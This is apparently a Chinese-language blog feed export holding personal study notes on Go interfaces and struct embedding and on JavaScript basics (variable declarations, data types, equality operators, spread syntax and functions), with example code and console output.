<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="type">string</span></span><br><span class="line">    Age  <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// type Person implements the interface Stringer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%v (%v years)&quot;</span>, p.Name, p.Age) <span class="comment">// 返回一个字符串</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a := Person&#123;<span class="string">&quot;Arthur Dent&quot;</span>, <span class="number">42</span>&#125;</span><br><span class="line">    z := Person&#123;<span class="string">&quot;Zaphod Beeblebrox&quot;</span>, <span class="number">9001</span>&#125;</span><br><span class="line">    fmt.Println(a, z) <span class="comment">// 输出：Arthur Dent (42 years) Zaphod Beeblebrox (9001 years)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-8-自定义错误处理-error-接口"><a href="#2-8-自定义错误处理-error-接口" class="headerlink" title="2.8. 自定义错误处理 - error 接口"></a>2.8. 自定义错误处理 - error 接口</h4><p><code>error</code>接口定义如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="type">error</span> <span class="keyword">interface</span> &#123;</span><br><span class="line">    Error() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MyError <span class="keyword">struct</span> &#123;</span><br><span class="line">    When time.Time</span><br><span class="line">    What <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// type MyError implements the interface error</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *MyError)</span></span> Error() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;at %v, %s&quot;</span>,</span><br><span class="line">        e.When, e.What)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回一个 error 接口类型变量</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">run</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;MyError&#123;</span><br><span class="line">        time.Now(),</span><br><span class="line">        <span class="string">&quot;it didn&#x27;t work&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> err := run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err) <span class="comment">// at 2009-11-10 23:00:00 +0000 UTC m=+0.000000001, it didn&#x27;t work</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-嵌入类型-继承"><a href="#3-嵌入类型-继承" class="headerlink" title="3. 嵌入类型 - 继承"></a>3. 嵌入类型 - 继承</h3><h4 id="3-1-声明"><a href="#3-1-声明" class="headerlink" title="3.1. 声明"></a>3.1. 声明</h4><p>嵌入类型将已有类型直接声明在新的结构里，新的类型被称为<strong>外部类型</strong>，被嵌入的类型被称为<strong>内部类型</strong>。如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> &lt;类型名&gt; <span class="keyword">struct</span> &#123;</span><br><span class="line">    内部类型<span class="number">1</span>名</span><br><span class="line">    ...</span><br><span class="line">    属性<span class="number">1</span>名</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-2-创建"><a href="#3-2-创建" class="headerlink" title="3.2. 创建"></a>3.2. 创建</h4><p><strong>注意：创建时，依然需要区分出内部类型。因为外部类型有可能会覆盖内部类型中的标识符。</strong> 示例如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> user <span class="keyword">struct</span> &#123;</span><br><span class="line">    name  <span class="type">string</span></span><br><span class="line">    email <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> admin <span class="keyword">struct</span> &#123;</span><br><span class="line">    user    <span class="comment">// 嵌入 user 类型，相当于 admin 继承了 user 类型</span></span><br><span class="line">    level <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Error: cannot use promoted field user.name in struct literal of type admin</span></span><br><span class="line">    <span class="comment">// Error: cannot use promoted field user.email in struct literal of type admin</span></span><br><span class="line">    <span class="comment">// ad := admin&#123;</span></span><br><span class="line">    <span class="comment">//     name:  &quot;john&quot;,</span></span><br><span class="line">    <span class="comment">//     email: &quot;qq.com&quot;,</span></span><br><span class="line">    <span class="comment">//     level: &quot;1&quot;,</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建类型，需要区别出内部类型</span></span><br><span class="line">    ad := admin&#123;</span><br><span class="line">        user: user&#123;</span><br><span class="line">            name:  <span class="string">&quot;john&quot;</span>,</span><br><span class="line">            email: <span class="string">&quot;qq.com&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        level: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3-2-继承属性和方法"><a href="#3-2-继承属性和方法" class="headerlink" title="3.2. 继承属性和方法"></a>3.2. 继承属性和方法</h4><p><strong>内部类型中的标识符(属性和方法)<strong>都会</strong>提升</strong>到外部类型中，就像直接在外部类型中声明了一样。</p>
<p>延续3.1中的例子：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可以通过内部类型访问内部类型的属性</span></span><br><span class="line">fmt.Println(ad.user.name)   <span class="comment">// 输出：john</span></span><br><span class="line"><span class="comment">// 也可以直接访问内部类型的属性</span></span><br><span class="line">fmt.Println(ad.name)        <span class="comment">// 输出：john</span></span><br></pre></td></tr></table></figure>

<h4 id="3-3-覆盖属性和方法"><a href="#3-3-覆盖属性和方法" class="headerlink" title="3.3. 覆盖属性和方法"></a>3.3. 覆盖属性和方法</h4><p>外部类型也可以通过声明与内部类型同名的标识符，来<strong>覆盖</strong>内部标识符的属性或方法。这样，<strong>内部类型中对应的标识符将不会被提升</strong>，但其值依然存在。</p>
<p>示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> user <span class="keyword">struct</span> &#123;</span><br><span class="line">    name  <span class="type">string</span></span><br><span class="line">    email <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> admin <span class="keyword">struct</span> &#123;</span><br><span class="line">    user</span><br><span class="line">    name <span class="type">string</span> <span class="comment">// 覆盖 user 类型中的 name 属性</span></span><br><span class="line">    level <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// cannot use promoted field user.name in struct literal of type admin</span></span><br><span class="line">    <span class="comment">// cannot use promoted field user.email in struct literal of type admin</span></span><br><span class="line">    ad := admin&#123;</span><br><span class="line">        user: user&#123;</span><br><span class="line">            name:  <span class="string">&quot;john&quot;</span>,</span><br><span class="line">            email: <span class="string">&quot;qq.com&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        name: <span class="string">&quot;tom&quot;</span>,</span><br><span class="line">        level: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(ad.name)        <span class="comment">// 输出：tom</span></span><br><span class="line">    fmt.Println(ad.user.name)   <span class="comment">// 输出：john</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-公开或未公开的标识符-私有与公有"><a href="#4-公开或未公开的标识符-私有与公有" class="headerlink" title="4. 公开或未公开的标识符 - 私有与公有"></a>4. 公开或未公开的标识符 - 私有与公有</h3><p>要使用<strong>另一个包中的类型</strong>时，<strong>类型名首字母需要大写</strong>，调用格式为：<code>&lt;package&gt;.&lt;name&gt;</code>(<code>package</code>为包名，<code>name</code>为类型名)。</p>
<p>若要调用<strong>公开类型中的属性和方法</strong>时，属性和方法名的首字母也必须是大写。</p>
<p>示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;study/my_study/obj&quot;</span> <span class="comment">// 导入另一个包</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">    <span class="comment">// Person 为 study/my_study/obj 包中的类型</span></span><br><span class="line">    boss := obj.Person&#123;</span><br><span class="line">        Name: <span class="string">&quot;aaaaa&quot;</span>,</span><br><span class="line">        Email: <span class="string">&quot;123456&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 Person 类型的公开方法</span></span><br><span class="line">    boss.Notify()</span><br><span class="line">    boss.ChangeEmail(<span class="string">&quot;2222&quot;</span>)</span><br><span class="line">    fmt.Println(boss)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>程序设计语言</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript基础语法学习</title>
    <url>/javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是一次简单的、对于<code>JavaScript</code>基础语法的重新学习，只记录<code>JavaScript</code>与<code>C\C++</code>的不同之处，相同的不再赘述。</p>
<p>其中加入了一些<code>ES6</code>的特性。</p>
<span id="more"></span>

<h3 id="一、输出"><a href="#一、输出" class="headerlink" title="一、输出"></a>一、输出</h3><ul>
<li><p>使用 window.alert() 弹出警告框。</p>
</li>
<li><p>使用 document.write() 方法将内容写到 HTML 文档中。</p>
</li>
<li><p>使用 console.log() 写入到浏览器的控制台。（常用）</p>
</li>
</ul>
<h3 id="二、变量"><a href="#二、变量" class="headerlink" title="二、变量"></a>二、变量</h3><h4 id="1-声明"><a href="#1-声明" class="headerlink" title="1.声明"></a>1.声明</h4><ul>
<li><p><code>var name</code> 或 <code>var num = 1</code>。 不用说明变量的类型，编译器会自行判断。若初始化，则是初始化值的类型；若未初始化，则是undefined数据类型。每当该变量再次被赋值或再次被声明定义时，会被转换成新的数据类型。</p>
</li>
<li><p><code>let name</code>。 声明的是块级作用域变量，只在块级作用域内有效，不能被块外部访问，且不可重名。块级指{….}之内的内容，如<code>for&#123;&#125;</code>中。</p>
</li>
<li><p><code>const name = &#39;jek&#39;</code>。 声明常量，块级作用域，必须初始化，不可修改。</p>
</li>
</ul>
<p><code>let</code>和<code>const</code>两种声明方式，和<strong>块级作用域</strong>为<code>ES6</code>特性。</p>
<p>练习代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * var、let、const声明变量</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// var声明变量后，可以赋不同类型的值和重新声明定义</span></span><br><span class="line"><span class="keyword">var</span> v1 = <span class="number">1</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(v1, <span class="keyword">typeof</span> v1); <span class="comment">// 1 number</span></span><br><span class="line">v1 = <span class="string">&#x27;ssss&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(v1, <span class="keyword">typeof</span> v1); <span class="comment">// ssss string</span></span><br><span class="line"><span class="keyword">var</span> v1 = <span class="literal">false</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(v1, <span class="keyword">typeof</span> v1); <span class="comment">// false boolean</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// var声明函数内局部变量，外部可访问，但不能访问到局部变量的值。按理来说外部是不可访问的，此处我也很迷惑</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> name = <span class="string">&#x27;bbbb&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name, <span class="keyword">typeof</span> name); <span class="comment">//  string</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// var声明块级变量，外部可以访问且值相同</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> x = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// let 声明块内变量，块级作用域，块内有效，外部无法访问</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> y = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// console.log(y); // ReferenceError: y is not defined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// const 声明，无法修改</span></span><br><span class="line"><span class="keyword">const</span> pi = <span class="number">3.14</span>;</span><br><span class="line"><span class="comment">// pi = 3; // TypeError: invalid assignment to const `pi&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pi);</span><br><span class="line"></span><br><span class="line"><span class="comment">// const 声明，块级作用域，块内有效，外部不可访问</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> z = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// console.log(z); // ReferenceError: z is not defined</span></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">1 &quot;number&quot;</span><br><span class="line">ssss string</span><br><span class="line">false &quot;boolean&quot;</span><br><span class="line"> string</span><br><span class="line">4</span><br><span class="line">Uncaught ReferenceError: y is not defined</span><br></pre></td></tr></table></figure>

<p>（注：<code>js</code>有变量提升的特性，即允许先使用(如赋值)再声明(必须用<code>var</code>声明)，但不建议使用）</p>
<h4 id="2-数据类型-6种值类型-3种引用类型-x2F-6种原始类型-对象类型"><a href="#2-数据类型-6种值类型-3种引用类型-x2F-6种原始类型-对象类型" class="headerlink" title="2.数据类型(6种值类型+3种引用类型)&#x2F;(6种原始类型+对象类型)"></a>2.数据类型(6种值类型+3种引用类型)&#x2F;(6种原始类型+对象类型)</h4><p><code>typeof(var)</code>函数检测<code>var</code>变量的变量类型。</p>
<h5 id="1）string"><a href="#1）string" class="headerlink" title="1）string"></a>1）string</h5><p>字符串：<code>var str = &#39;hello&#39;</code>。 可以用双引号或单引号包裹，如<code>&quot;hello&quot;</code>和<code>&#39;hello&#39;</code>都可以（建议用单引号）。可以通过下标访问字符串中的字符。</p>
<p>两个字符串之间可以通过 <code>+</code> 拼接。</p>
<p><code>ES6</code>中新增了<strong>字符串模板</strong>的特性。字符串需用 `` 包裹起来，字符串中需要替换的变量用<code>$&#123;&#125;</code>包裹。示例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name=<span class="string">&quot;lsj&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`hello <span class="subst">$&#123;name&#125;</span>`</span>);</span><br></pre></td></tr></table></figure>

<p>输出<code>hello lsj</code></p>
<h5 id="2）number"><a href="#2）number" class="headerlink" title="2）number"></a>2）number</h5><p>数字：<code>var num = 1</code>。 包括整数、浮点数、科学计数法表示的数(2.1e10)。</p>
<p><code>js</code>中浮点数的精度是个待解决的问题。</p>
<p>数字可以与字符串通过 <code>+</code> 拼接，此时数字会被强转成字符串。</p>
<h5 id="3）boolean"><a href="#3）boolean" class="headerlink" title="3）boolean"></a>3）boolean</h5><p>布尔类型：<code>var bo = true</code>。</p>
<h5 id="4）undefined"><a href="#4）undefined" class="headerlink" title="4）undefined"></a>4）undefined</h5><p>无定义类型：<code>var name</code>。 当变量声明却没有被定义，或者输出一个未声明的变量时，则为undefined类型。</p>
<h5 id="5）null"><a href="#5）null" class="headerlink" title="5）null"></a>5）null</h5><p>空类型：<code>var name = null</code>或<code>name = null</code>。 用来将变量置空，其实表示一个空对象引用。</p>
<h5 id="6）symbol"><a href="#6）symbol" class="headerlink" title="6）symbol"></a>6）symbol</h5><p><code>symbol</code>是<code>ES6</code>引入了一种新的原始数据类型，表示独一无二的值。</p>
<blockquote>
<p>Symbol()函数栈不能用 new 命令，因为 Symbol 是原始数据类型，不是对象。可以接受一个字符串作为参数，为新创建的 Symbol 提供描述，用来显示在控制台或者作为字符串的时候使用，便于区分。</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sy = <span class="title class_">Symbol</span>(<span class="string">&quot;KK&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(sy);   <span class="comment">// Symbol(KK)</span></span><br><span class="line"><span class="title function_">typeof</span>(sy);        <span class="comment">// &quot;symbol&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 相同参数 Symbol() 返回的值不相等</span></span><br><span class="line"><span class="keyword">let</span> sy1 = <span class="title class_">Symbol</span>(<span class="string">&quot;kk&quot;</span>);</span><br><span class="line">sy === sy1;       <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<h5 id="7）array"><a href="#7）array" class="headerlink" title="7）array"></a>7）array</h5><p>数组：<code>var arr = [1,2,3]</code>或者<code>var arr = new Array(1,2,3)</code>。 在js中数组类型其实算作一种对象类型。</p>
<p>同时，<code>js</code>数组与<code>C</code>数组还有几个不同点：</p>
<ul>
<li><code>js</code>数组的每一项可以用来保存任何类型的数据，也就是说，可以用数组的第一个位置来保存字符串，第二个位置保存数值，第三个位置保存对象。</li>
<li>数组的大小是可以动态调整的。</li>
<li>访问超限时，输出<code>undefined</code>。</li>
</ul>
<h5 id="8）function"><a href="#8）function" class="headerlink" title="8）function"></a>8）function</h5><p>函数。在<code>js</code>中，函数也是变量，后面详细介绍。</p>
<h5 id="9）object"><a href="#9）object" class="headerlink" title="9）object"></a>9）object</h5><p>对象。也算变量，后面再详细介绍。</p>
<p>练习代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 变量数据类型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// number类型。包括浮点数、整数</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">3</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num, <span class="keyword">typeof</span> num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// string类型。定义时，可以用单引号，也可以用双引号</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str, <span class="keyword">typeof</span> str);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取字符串中的某个字符</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str[<span class="number">1</span>], <span class="keyword">typeof</span> str[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串是不可变的，如果对字符串的某个索引赋值，不会有任何错误，但是，也没有任何效果</span></span><br><span class="line">str[<span class="number">1</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拼接字符串和数字</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str + num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// boolean类型</span></span><br><span class="line"><span class="keyword">var</span> bo = <span class="literal">true</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bo, <span class="keyword">typeof</span> bo);</span><br><span class="line"></span><br><span class="line"><span class="comment">// undefined类型</span></span><br><span class="line"><span class="keyword">var</span> udf;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(udf, <span class="keyword">typeof</span> udf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// null类型</span></span><br><span class="line"><span class="keyword">var</span> nu = <span class="literal">null</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nu, <span class="keyword">typeof</span> nu);</span><br><span class="line"></span><br><span class="line"><span class="comment">// array类型</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="comment">// var arr = new Array(1,2,3);</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr, <span class="keyword">typeof</span> arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问超限，会输出undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组中可包含任意类型</span></span><br><span class="line">arr = [<span class="number">1</span>, <span class="string">&#x27;hello&#x27;</span>, [<span class="number">2</span>, <span class="number">3</span>]];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr, <span class="keyword">typeof</span> arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用push()函数可向数组末尾添加元素</span></span><br><span class="line"><span class="comment">// arr.push(&#x27;new&#x27;);</span></span><br><span class="line"><span class="comment">// console.log(arr);</span></span><br><span class="line"><span class="comment">// 为什么要用下面这种方法呢？异步问题！！！上下两端代码输出不一样！！！</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="string">&#x27;new&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arr);</span><br><span class="line">&#125;, <span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// function类型</span></span><br><span class="line"><span class="keyword">var</span> fun = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;this is a function&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fun, <span class="keyword">typeof</span> fun);</span><br><span class="line"></span><br><span class="line"><span class="comment">// object类型</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;tomcat&#x27;</span>,</span><br><span class="line">    <span class="attr">getName</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj, <span class="keyword">typeof</span> obj);</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">3 &quot;number&quot;</span><br><span class="line">hello string</span><br><span class="line">hello 3</span><br><span class="line">true &quot;boolean&quot;</span><br><span class="line">undefined &quot;undefined&quot;</span><br><span class="line">null &quot;object&quot;</span><br><span class="line">[1, 2, 3] &quot;object&quot;</span><br><span class="line">undefined</span><br><span class="line">[1, &quot;hello&quot;, Array(2)] &quot;object&quot;</span><br><span class="line">ƒ () &#123;</span><br><span class="line">  console.log(&#x27;this is a function&#x27;);</span><br><span class="line">&#125; &quot;function&quot;</span><br><span class="line">&#123;name: &quot;tomcat&quot;, getName: ƒ&#125; &quot;object&quot;</span><br></pre></td></tr></table></figure>

<h3 id="三、运算符"><a href="#三、运算符" class="headerlink" title="三、运算符"></a>三、运算符</h3><p>特别注意：在<code>js</code>中有相等<code>==</code>和绝对相等<code>===</code>，不相等<code>!=</code>和不绝对相等<code>!==</code>。区分如下：</p>
<ul>
<li><code>==</code>。“值”相等为true，类型可以不相等。如：1 &#x3D;&#x3D; ‘1’</li>
<li><code>===</code>。“值”和类型都必须相等才为true</li>
<li><code>!=</code>。类型相等时，“值”不相等才为false</li>
<li><code>!==</code>。“值”或者类型不相等，为false</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num1 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> str1 = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// == 与 ===</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num1 == str1); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num1 === str1); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// != 与 !==</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num1 != str1); <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num1 !== str1); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>推荐使用<code>===</code>和<code>!==</code>。</p>
<p>其它运算符与<code>c</code>语言的相同。</p>
<h3 id="四、语句"><a href="#四、语句" class="headerlink" title="四、语句"></a>四、语句</h3><p>if、for、while、switch等，与<code>c</code>相同。</p>
<p><code>ES6</code>新特性：运算符 <code>...</code> 用于取出参数<strong>对象&#x2F;数组</strong>的所有可遍历属性，然后拷贝到当前对象。如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;<span class="attr">name</span>: <span class="string">&quot;Amy&quot;</span>, <span class="attr">age</span>: <span class="number">15</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> someone = &#123; ...person &#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(someone);  <span class="comment">//&#123;name: &quot;Amy&quot;, age: 15&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">let</span> arr1 = [...arr];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr1); <span class="comment">// [1, 2]</span></span><br></pre></td></tr></table></figure>

<h3 id="五、函数"><a href="#五、函数" class="headerlink" title="五、函数"></a>五、<strong>函数</strong></h3><h4 id="1-函数定义"><a href="#1-函数定义" class="headerlink" title="1.函数定义"></a>1.函数定义</h4><h5 id="1）函数语句定义-常规"><a href="#1）函数语句定义-常规" class="headerlink" title="1）函数语句定义(常规)"></a>1）函数语句定义(常规)</h5><p>参数，可有可无，不用指定数据类型(js中，变量本就不需指定类型)，默认为undefined类型。传入参数个数不定，按顺序未传入的参数为undefined。<code>ES6</code>中参数可以<strong>设定默认值</strong>。</p>
<p>返回值，可有可无。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">funA</span> (a, b) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;a is &#x27;</span> + a);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;b is &#x27;</span> + b);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;a+b is &#x27;</span> + (a+b));</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">funA</span>(<span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line"><span class="title function_">funA</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 函数参数可以设定默认值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">funB</span> (a, b = <span class="number">10</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;默认值 || &#x27;</span> + (a+b));</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">funB</span>(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">a is 2</span><br><span class="line">b is 4</span><br><span class="line">a+b is 6</span><br><span class="line">a is 2</span><br><span class="line">b is undefined</span><br><span class="line">a+b is NaN</span><br><span class="line">默认值 || 13</span><br></pre></td></tr></table></figure>

